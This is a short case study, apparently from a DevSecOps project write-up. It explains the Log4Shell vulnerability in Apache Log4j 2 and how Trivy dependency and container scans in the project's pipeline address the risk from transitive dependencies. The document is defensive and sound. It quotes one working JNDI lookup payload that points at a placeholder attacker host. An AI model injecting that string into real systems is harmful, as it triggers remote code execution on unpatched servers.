# Industry Case Study: Log4Shell and Dependency Scanning

## The incident

In December 2021 a critical remote-code-execution flaw, **Log4Shell**
(CVE-2021-44228, CVSS 10.0), was disclosed in Apache Log4j 2, a logging library
embedded in a vast range of Java applications. A crafted string such as
`${jndi:ldap://attacker/x}` written to a log caused Log4j to fetch and execute
remote code. The vulnerability was devastating not because Log4j was obscure but
because it was ubiquitous and, in most affected systems, a **transitive
dependency** — pulled in indirectly by other libraries, so teams often did not
know they were running it. Exploitation began within hours of disclosure, and
organisations spent weeks simply discovering where the vulnerable versions were.

## Why it happened

Log4Shell was fundamentally a **software-supply-chain and visibility** failure.
The dangerous JNDI-lookup feature had shipped for years, and few teams maintained
an inventory of their dependencies or scanned them continuously, so a known-bad
version could sit deep in the dependency tree unnoticed until it was actively
exploited.

## How our pipeline addresses it

This is the exact class of risk our **dependency and container scanning gates**
target. The pipeline runs **Trivy** in two modes: a filesystem scan of the
project's declared dependencies and an image scan of the container we build
(`.github/workflows/devsecops.yml`, the "SCA - Trivy filesystem" and "Container
image - Trivy" jobs). On every push, Trivy resolves the dependency tree —
including transitive dependencies, the layer Log4Shell hid in — and reports
known CVEs by severity, giving the continuous inventory that was missing in 2021.
The fit is direct: WebGoat even ships a `vulnerablecomponents` lesson built
around outdated libraries, so the gate has real findings to surface. Combined
with the SAST and secret gates, this reflects the DevSecOps "shift-left"
lesson of Log4Shell: security must be automated and continuous, so that when the
next ubiquitous dependency flaw lands, knowing whether you are affected is a
pipeline query rather than a multi-week manual hunt.
